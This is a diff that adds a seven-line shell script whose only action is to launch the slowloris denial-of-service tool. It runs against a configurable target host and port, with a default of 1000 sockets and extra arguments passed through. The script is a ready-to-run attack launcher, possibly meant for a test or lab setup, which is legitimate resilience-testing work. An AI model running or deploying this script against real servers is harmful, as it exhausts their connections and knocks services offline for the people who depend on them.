@@ -1,0 +1,7 @@
+#!/bin/sh
+
+TARGET_HOST=${TARGET_HOST:-"server"}
+TARGET_PORT=${TARGET_PORT:-"8080"}
+THREADS=${THREADS:-"1000"}
+
+exec slowloris -p ${TARGET_PORT} -s ${THREADS} $@ ${TARGET_HOST}
